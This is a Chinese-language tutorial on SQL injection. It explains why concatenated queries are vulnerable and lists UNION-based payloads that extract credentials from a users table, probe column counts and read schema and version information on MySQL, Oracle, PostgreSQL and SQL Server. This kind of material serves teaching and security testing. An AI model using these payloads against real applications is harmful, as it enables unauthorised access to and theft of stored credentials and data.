# SQL注入

## SQL注入原理

SQL注入漏洞源自于程序员在应用开发时，通过 **拼接** 的方式来生成SQL语句。考虑以下代码：

> $sql = "SELECT title, description FROM books WHERE isbn = '" + $isbn + "' AND public = 1";

在“正常”情况下，程序员期待生成的SQL语句是类似这样的：

> SELECT title, description  
> FROM books  
> WHERE isbn = '`123`'  
> AND public = 1

但如果变量`$isbn`受控，我们可以令：

> $isbn = "`' UNION SELECT username, password FROM users -- `";

拼接后，SQL语句变为：

> SELECT title, description  
> FROM books  
> WHERE isbn = '<font color="red">' UNION SELECT username, password FROM users</font><font color="grey"> -- ' AND public = 1</font>

这样我们就把表`users`中的`username`和`password`也查出来了。

## UNION注入

### 确定SQL语句中“列”的数量

#### 方法一：通过 ORDER BY 子句试探

可以通过一系列“`ORDER BY 1`” 、“`ORDER BY 2`” ... 子句进行试探，如果进行到 “`ORDER BY n`” 时报错，则SQL语句有`n-1`列。

#### 方法二：通过 UNION SELECT UNLL 子句试探

可以通过一系列“`UNION SELECT NULL`”、“`UNION SELECT UNLL, NULL`” ... 子句进行试探，如果 SELECT `n` 个 NULL 时不再报错则SQL语句有`n`列。之所以用`NULL`，是因为每一列的元素数据类型要兼容，`NULL`与任何类型都兼容。

### 确定SQL语句中哪些列兼容字符串

通过一系列“`UNION SELECT 'a', NULL`”、“`UNION SELECT NULL, 'a'`”之类进行试探即可。

### 查询数据库版本

| 数据库           | SQL语法                      |
|------------------|------------------------------|
| MySQL，SqlServer | SELECT @@version             |
| Oracle           | SELECT banner FROM v$version |
| PostgreSQL       | SELECT version()             |

### 查询表信息

| 数据库                       | SQL语法                                                        |
|------------------------------|----------------------------------------------------------------|
| MySQL，SqlServer，PostgreSQL | SELECT table_schema, table_name FROM information_schema.tables |
| Oracle                       | SELECT owner, table_name FROM all_tables                       |

### 查询列信息

| 数据库                       | SQL语法                                                                                       |
|------------------------------|-----------------------------------------------------------------------------------------------|
| MySQL，SqlServer，PostgreSQL | SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'TABLE-NAME' |
| Oracle                       | SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'TABLE-NAME'            |

### 把多个表列的信息合并为一列显示

`' UNION SELECT CONCAT(username, '~', password) FROM users-- `

| 数据库               | 拼接语法               |
|---------------------|-----------------------|
| MySQL               | CONCAT('foo', 'bar')  |
| Oracle， PostgreSQL | 'foo' \|\| 'bar'      |
| Microsoft           | 'foo' + 'bar'         |
